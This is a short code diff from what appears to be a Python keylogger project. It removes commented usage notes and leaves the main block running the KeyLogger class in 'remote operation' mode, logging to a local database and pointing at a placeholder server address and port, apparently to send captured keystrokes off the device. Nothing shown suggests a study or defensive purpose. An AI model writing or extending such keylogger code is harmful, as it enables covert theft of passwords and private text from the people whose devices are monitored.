@@ -218,10 +218,5 @@ class KeyLogger(IKeyLogger):
                 return []
 
 if __name__ == "__main__":
-    # Example usage
-    # For local operation:
-    # keylogger = KeyLogger("keylogger.db")
-    
-    # For remote operation:
     keylogger = KeyLogger("keylogger.db", remote_host="your_server_ip", remote_port=12345)
     print(keylogger.start_logging("Device-1")) 
